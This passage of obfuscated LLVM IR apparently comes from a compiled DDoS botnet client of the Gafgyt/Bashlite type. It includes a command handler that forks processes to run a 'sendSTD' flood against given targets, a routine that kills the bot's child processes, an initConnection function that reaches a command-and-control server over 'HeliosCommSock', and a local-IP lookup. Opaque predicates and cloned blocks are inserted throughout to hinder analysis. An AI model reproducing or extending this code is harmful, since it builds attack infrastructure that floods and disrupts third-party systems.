  %869 = getelementptr inbounds i8*, i8** %868, i64 3
  %870 = load i8*, i8** %869, align 8
  %871 = call i32 @atoi(i8* %870) #10
  store i32 %871, i32* %27, align 4
  %872 = load i8*, i8** %25, align 8
  %873 = call i8* @strstr(i8* %872, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %874 = icmp ne i8* %873, null
  br i1 %874, label %875, label %907

; <label>:875:                                    ; preds = %860
  %876 = load i8*, i8** %25, align 8
  %877 = call i8* @strtok(i8* %876, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %877, i8** %28, align 8
  br label %878

; <label>:878:                                    ; preds = %904, %875
  %879 = load i32, i32* @x.89
  %880 = load i32, i32* @y.90
  %881 = sub i32 %879, 1
  %882 = mul i32 %879, %881
  %883 = urem i32 %882, 2
  %884 = icmp eq i32 %883, 0
  %885 = icmp slt i32 %880, 10
  %886 = or i1 %884, %885
  br i1 %886, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %878
  %887 = load i8*, i8** %28, align 8
  %888 = icmp ne i8* %887, null
  %889 = load i32, i32* @x.89
  %890 = load i32, i32* @y.90
  %891 = sub i32 %889, 1
  %892 = mul i32 %889, %891
  %893 = urem i32 %892, 2
  %894 = icmp eq i32 %893, 0
  %895 = icmp slt i32 %890, 10
  %896 = or i1 %894, %895
  br i1 %896, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %888, label %897, label %906

; <label>:897:                                    ; preds = %originalBBpart2104
  %898 = call i32 @listFork()
  %899 = icmp ne i32 %898, 0
  br i1 %899, label %904, label %900

; <label>:900:                                    ; preds = %897
  %901 = load i8*, i8** %28, align 8
  %902 = load i32, i32* %26, align 4
  %903 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %901, i32 %902, i32 %903)
  call void @_exit(i32 0) #12
  unreachable

; <label>:904:                                    ; preds = %897
  %905 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %905, i8** %28, align 8
  br label %878

; <label>:906:                                    ; preds = %originalBBpart2104
  br label %915

; <label>:907:                                    ; preds = %860
  %908 = call i32 @listFork()
  %909 = icmp ne i32 %908, 0
  br i1 %909, label %910, label %911

; <label>:910:                                    ; preds = %907
  br label %1001

; <label>:911:                                    ; preds = %907
  %912 = load i8*, i8** %25, align 8
  %913 = load i32, i32* %26, align 4
  %914 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %912, i32 %913, i32 %914)
  call void @_exit(i32 0) #12
  unreachable

; <label>:915:                                    ; preds = %906
  br label %916

; <label>:916:                                    ; preds = %915, %originalBBpart288
  %917 = load i8**, i8*** %4, align 8
  %918 = getelementptr inbounds i8*, i8** %917, i64 0
  %919 = load i8*, i8** %918, align 8
  %920 = call i32 @strcmp(i8* %919, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.404, i32 0, i32 0)) #10
  %921 = icmp ne i32 %920, 0
  br i1 %921, label %1001, label %922

; <label>:922:                                    ; preds = %916
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  br label %923

; <label>:923:                                    ; preds = %981, %922
  %924 = load i64, i64* %30, align 8
  %925 = load i64, i64* @numpids, align 8
  %926 = icmp ult i64 %924, %925
  br i1 %926, label %927, label %984

; <label>:927:                                    ; preds = %923
  %928 = load i32*, i32** @pids, align 8
  %929 = load i64, i64* %30, align 8
  %930 = getelementptr inbounds i32, i32* %928, i64 %929
  %931 = load i32, i32* %930, align 4
  %932 = icmp ne i32 %931, 0
  br i1 %932, label %933, label %980

; <label>:933:                                    ; preds = %927
  %934 = load i32, i32* @x.89
  %935 = load i32, i32* @y.90
  %936 = sub i32 %934, 1
  %937 = mul i32 %934, %936
  %938 = urem i32 %937, 2
  %939 = icmp eq i32 %938, 0
  %940 = icmp slt i32 %935, 10
  %941 = or i1 %939, %940
  br i1 %941, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %933
  %942 = load i32*, i32** @pids, align 8
  %943 = load i64, i64* %30, align 8
  %944 = getelementptr inbounds i32, i32* %942, i64 %943
  %945 = load i32, i32* %944, align 4
  %946 = call i32 @getpid() #2
  %947 = icmp ne i32 %945, %946
  %948 = load i32, i32* @x.89
  %949 = load i32, i32* @y.90
  %950 = sub i32 %948, 1
  %951 = mul i32 %948, %950
  %952 = urem i32 %951, 2
  %953 = icmp eq i32 %952, 0
  %954 = icmp slt i32 %949, 10
  %955 = or i1 %953, %954
  br i1 %955, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %947, label %956, label %980

; <label>:956:                                    ; preds = %originalBBpart2108
  %957 = load i32, i32* @x.89
  %958 = load i32, i32* @y.90
  %959 = sub i32 %957, 1
  %960 = mul i32 %957, %959
  %961 = urem i32 %960, 2
  %962 = icmp eq i32 %961, 0
  %963 = icmp slt i32 %958, 10
  %964 = or i1 %962, %963
  br i1 %964, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %956
  %965 = load i32*, i32** @pids, align 8
  %966 = load i64, i64* %30, align 8
  %967 = getelementptr inbounds i32, i32* %965, i64 %966
  %968 = load i32, i32* %967, align 4
  %969 = call i32 @kill(i32 %968, i32 9) #2
  %970 = load i32, i32* %29, align 4
  %971 = add nsw i32 %970, 1
  store i32 %971, i32* %29, align 4
  %972 = load i32, i32* @x.89
  %973 = load i32, i32* @y.90
  %974 = sub i32 %972, 1
  %975 = mul i32 %972, %974
  %976 = urem i32 %975, 2
  %977 = icmp eq i32 %976, 0
  %978 = icmp slt i32 %973, 10
  %979 = or i1 %977, %978
  br i1 %979, label %originalBBpart2117, label %originalBB110alteredBB

originalBBpart2117:                               ; preds = %originalBB110
  br label %980

; <label>:980:                                    ; preds = %originalBBpart2117, %originalBBpart2108, %927
  br label %981

; <label>:981:                                    ; preds = %980
  %982 = load i64, i64* %30, align 8
  %983 = add i64 %982, 1
  store i64 %983, i64* %30, align 8
  br label %923

; <label>:984:                                    ; preds = %923
  %985 = load i32, i32* @x.89
  %986 = load i32, i32* @y.90
  %987 = sub i32 %985, 1
  %988 = mul i32 %985, %987
  %989 = urem i32 %988, 2
  %990 = icmp eq i32 %989, 0
  %991 = icmp slt i32 %986, 10
  %992 = or i1 %990, %991
  br i1 %992, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %984
  %993 = load i32, i32* @x.89
  %994 = load i32, i32* @y.90
  %995 = sub i32 %993, 1
  %996 = mul i32 %993, %995
  %997 = urem i32 %996, 2
  %998 = icmp eq i32 %997, 0
  %999 = icmp slt i32 %994, 10
  %1000 = or i1 %998, %999
  br i1 %1000, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br label %1001

; <label>:1001:                                   ; preds = %originalBBpart2121, %916, %910, %859, %634, %534, %334, %202, %originalBBpart220, %107, %86, %81, %52, %36
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %62
  %1002 = load i32, i32* @scanPid, align 4
  %1003 = icmp ne i32 %1002, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %1004 = load i32, i32* %5, align 4
  %1005 = icmp eq i32 %1004, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %112
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %138
  %1006 = load i8**, i8*** %4, align 8
  %1007 = getelementptr inbounds i8*, i8** %1006, i64 3
  %1008 = load i8*, i8** %1007, align 8
  %1009 = call i32 @atoi(i8* %1008) #10
  %1010 = icmp slt i32 %1009, 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %160
  %1011 = load i8**, i8*** %4, align 8
  %1012 = getelementptr inbounds i8*, i8** %1011, i64 5
  %1013 = load i8*, i8** %1012, align 8
  %1014 = call i32 @atoi(i8* %1013) #10
  %1015 = icmp slt i32 %1014, 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %182
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %251
  %1016 = load i8**, i8*** %4, align 8
  %1017 = getelementptr inbounds i8*, i8** %1016, i64 3
  %1018 = load i8*, i8** %1017, align 8
  %1019 = call i32 @atoi(i8* %1018) #10
  %1020 = icmp eq i32 %1019, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %309
  %1021 = load i32, i32* %3, align 4
  %1022 = icmp eq i32 %1021, 7
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %362
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %383
  %1023 = load i8**, i8*** %4, align 8
  %1024 = getelementptr inbounds i8*, i8** %1023, i64 7
  %1025 = load i8*, i8** %1024, align 8
  %1026 = call i32 @atoi(i8* %1025) #10
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %409
  %1027 = load i8**, i8*** %4, align 8
  %1028 = getelementptr inbounds i8*, i8** %1027, i64 8
  %1029 = load i8*, i8** %1028, align 8
  %1030 = call i32 @atoi(i8* %1029) #10
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %430
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %447
  store i32 %448, i32* %15, align 4
  %1031 = load i8*, i8** %8, align 8
  %1032 = call i8* @strstr(i8* %1031, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %1033 = icmp ne i8* %1032, null
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %474
  %1034 = call i32 @listFork()
  %1035 = icmp ne i32 %1034, 0
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %505
  %1036 = call i32 @listFork()
  %1037 = icmp ne i32 %1036, 0
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %550
  %1038 = load i8**, i8*** %4, align 8
  %1039 = getelementptr inbounds i8*, i8** %1038, i64 2
  %1040 = load i8*, i8** %1039, align 8
  %1041 = call i32 @atoi(i8* %1040) #10
  %1042 = icmp eq i32 %1041, -1
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %578
  %1043 = load i8**, i8*** %4, align 8
  %1044 = getelementptr inbounds i8*, i8** %1043, i64 4
  %1045 = load i8*, i8** %1044, align 8
  %1046 = call i32 @atoi(i8* %1045) #10
  %1047 = icmp sgt i32 %1046, 32
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %612
  %1048 = load i8**, i8*** %4, align 8
  %1049 = getelementptr inbounds i8*, i8** %1048, i64 7
  %1050 = load i8*, i8** %1049, align 8
  %1051 = call i32 @atoi(i8* %1050) #10
  %1052 = icmp slt i32 %1051, 1
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %672
  store i32 %673, i32* %23, align 4
  %1053 = load i8*, i8** %17, align 8
  %1054 = call i8* @strstr(i8* %1053, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %1055 = icmp ne i8* %1054, null
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %693
  %1056 = load i8*, i8** %17, align 8
  %1057 = call i8* @strtok(i8* %1056, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %1057, i8** %24, align 8
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %726
  %1058 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %1058, i8** %24, align 8
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %757
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %774
  %1059 = load i8**, i8*** %4, align 8
  %1060 = getelementptr inbounds i8*, i8** %1059, i64 0
  %1061 = load i8*, i8** %1060, align 8
  %1062 = call i32 @strcmp(i8* %1061, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.403, i32 0, i32 0)) #10
  %1063 = icmp ne i32 %1062, 0
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %796
  %1064 = load i32, i32* %3, align 4
  %1065 = icmp slt i32 %1064, 4
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %815
  %1066 = load i8**, i8*** %4, align 8
  %1067 = getelementptr inbounds i8*, i8** %1066, i64 2
  %1068 = load i8*, i8** %1067, align 8
  %1069 = call i32 @atoi(i8* %1068) #10
  %1070 = icmp slt i32 %1069, 1
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %837
  %1071 = load i8**, i8*** %4, align 8
  %1072 = getelementptr inbounds i8*, i8** %1071, i64 3
  %1073 = load i8*, i8** %1072, align 8
  %1074 = call i32 @atoi(i8* %1073) #10
  %1075 = icmp slt i32 %1074, 1
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %878
  %1076 = load i8*, i8** %28, align 8
  %1077 = icmp ne i8* %1076, null
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %933
  %1078 = load i32*, i32** @pids, align 8
  %1079 = load i64, i64* %30, align 8
  %1080 = getelementptr inbounds i32, i32* %1078, i64 %1079
  %1081 = load i32, i32* %1080, align 4
  %1082 = call i32 @getpid() #2
  %1083 = icmp ne i32 %1081, %1082
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %956
  %1084 = load i32*, i32** @pids, align 8
  %1085 = load i64, i64* %30, align 8
  %1086 = getelementptr inbounds i32, i32* %1084, i64 %1085
  %1087 = load i32, i32* %1086, align 4
  %1088 = call i32 @kill(i32 %1087, i32 9) #2
  %1089 = load i32, i32* %29, align 4
  %_ = sub i32 0, %1089
  %gen = add i32 %_, 1
  %_111 = sub i32 0, %1089
  %gen112 = add i32 %_111, 1
  %_113 = sub i32 %1089, 1
  %gen114 = mul i32 %_113, 1
  %_115 = shl i32 %1089, 1
  %1090 = add nsw i32 %1089, 1
  store i32 %1090, i32* %29, align 4
  br label %originalBB110

originalBB119alteredBB:                           ; preds = %originalBB119, %984
  br label %originalBB119
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = load i32, i32* @x.91
  %2 = load i32, i32* @y.92
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %12, i8 0, i64 4096, i32 16, i1 false)
  %13 = load i32, i32* @HeliosCommSock, align 4
  %14 = icmp ne i32 %13, 0
  %15 = load i32, i32* @x.91
  %16 = load i32, i32* @y.92
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %26

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @HeliosCommSock, align 4
  %25 = call i32 @close(i32 %24)
  store i32 0, i32* @HeliosCommSock, align 4
  br label %26

; <label>:26:                                     ; preds = %23, %originalBBpart2
  %27 = load i32, i32* @currentServer, align 4
  %28 = add nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %26
  store i32 0, i32* @currentServer, align 4
  br label %35

; <label>:32:                                     ; preds = %26
  %33 = load i32, i32* @currentServer, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* @currentServer, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %31
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %37 = load i32, i32* @currentServer, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1 x i8*], [1 x i8*]* @AllDemDupes, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @strcpy(i8* %36, i8* %40) #2
  store i32 666, i32* %11, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %43 = call i8* @strchr(i8* %42, i32 58) #10
  %44 = icmp ne i8* %43, null
  br i1 %44, label %45, label %52

; <label>:45:                                     ; preds = %35
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %47 = call i8* @strchr(i8* %46, i32 58) #10
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = call i32 @atoi(i8* %48) #10
  store i32 %49, i32* %11, align 4
  %50 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #10
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %45, %35
  %53 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %53, i32* @HeliosCommSock, align 4
  %54 = load i32, i32* @HeliosCommSock, align 4
  %55 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %56 = load i32, i32* %11, align 4
  %57 = call i32 @connectTimeout(i32 %54, i8* %55, i32 %56, i32 30)
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

; <label>:59:                                     ; preds = %52
  store i32 1, i32* %9, align 4
  br label %77

; <label>:60:                                     ; preds = %52
  %61 = load i32, i32* @x.91
  %62 = load i32, i32* @y.92
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  store i32 0, i32* %9, align 4
  %69 = load i32, i32* @x.91
  %70 = load i32, i32* @y.92
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %originalBBpart24, %59
  %78 = load i32, i32* %9, align 4
  ret i32 %78

originalBBalteredBB:                              ; preds = %originalBB, %0
  %79 = alloca i32, align 4
  %80 = alloca [4096 x i8], align 16
  %81 = alloca i32, align 4
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %80, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %82, i8 0, i64 4096, i32 16, i1 false)
  %83 = load i32, i32* @HeliosCommSock, align 4
  %84 = icmp ne i32 %83, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  store i32 0, i32* %9, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.93
  %17 = load i32, i32* @y.94
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %1, align 4
  %24 = load i32, i32* @x.93
  %25 = load i32, i32* @y.94
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %229

; <label>:32:                                     ; preds = %0
  %33 = load i32, i32* @x.93
  %34 = load i32, i32* @y.94
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 16, i32 4, i1 false)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0)) #2
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  store i32 %43, i32* %45, align 4
  %46 = call zeroext i16 @htons(i16 zeroext 53) #13
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* %2, align 4
  %49 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %4, align 4
  %51 = load i32, i32* %4, align 4
  %52 = icmp eq i32 %51, -1
  %53 = load i32, i32* @x.93
  %54 = load i32, i32* @y.94
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %62

; <label>:61:                                     ; preds = %originalBBpart24
  store i32 0, i32* %1, align 4
  br label %229

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* @x.93
  %64 = load i32, i32* @y.94
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  store i32 16, i32* %6, align 4
  %71 = load i32, i32* %2, align 4
  %72 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %73 = call i32 @getsockname(i32 %71, %struct.sockaddr* %72, i32* %6) #2
  store i32 %73, i32* %4, align 4
  %74 = load i32, i32* %4, align 4
  %75 = icmp eq i32 %74, -1
  %76 = load i32, i32* @x.93
  %77 = load i32, i32* @y.94
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %85

; <label>:84:                                     ; preds = %originalBBpart28
  store i32 0, i32* %1, align 4
  br label %229

; <label>:85:                                     ; preds = %originalBBpart28
  %86 = load i32, i32* @x.93
  %87 = load i32, i32* @y.94
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %85
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %95 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 4
  store i32 %96, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %97 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.406, i32 0, i32 0), i32 0)
  store i32 %97, i32* %7, align 4
  %98 = load i32, i32* @x.93
  %99 = load i32, i32* @y.94
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %106

; <label>:106:                                    ; preds = %143, %originalBBpart212
  %107 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %108 = load i32, i32* %7, align 4
  %109 = call i8* @fdgets(i8* %107, i32 4096, i32 %108)
  %110 = icmp ne i8* %109, null
  br i1 %110, label %111, label %145

; <label>:111:                                    ; preds = %106
  %112 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %113 = call i8* @strstr(i8* %112, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.407, i32 0, i32 0)) #10
  %114 = icmp ne i8* %113, null
  br i1 %114, label %115, label %143

; <label>:115:                                    ; preds = %111
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %116, i8** %9, align 8
  br label %117

; <label>:117:                                    ; preds = %122, %115
  %118 = load i8*, i8** %9, align 8
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp ne i32 %120, 9
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %117
  %123 = load i8*, i8** %9, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %9, align 8
  br label %117

; <label>:125:                                    ; preds = %117
  %126 = load i32, i32* @x.93
  %127 = load i32, i32* @y.94
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %125
  %134 = load i8*, i8** %9, align 8
  store i8 0, i8* %134, align 1
  %135 = load i32, i32* @x.93
  %136 = load i32, i32* @y.94
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %145

; <label>:143:                                    ; preds = %111
  %144 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %144, i8 0, i64 4096, i32 16, i1 false)
  br label %106

; <label>:145:                                    ; preds = %originalBBpart216, %106
  %146 = load i32, i32* @x.93
  %147 = load i32, i32* @y.94
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %145
  %154 = load i32, i32* %7, align 4
  %155 = call i32 @close(i32 %154)
  %156 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %157 = load i8, i8* %156, align 16
  %158 = icmp ne i8 %157, 0
  %159 = load i32, i32* @x.93
  %160 = load i32, i32* @y.94
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %158, label %167, label %226

; <label>:167:                                    ; preds = %originalBBpart220
  %168 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %169 = bitcast %union.anon.5* %168 to [16 x i8]*
  %170 = getelementptr inbounds [16 x i8], [16 x i8]* %169, i32 0, i32 0
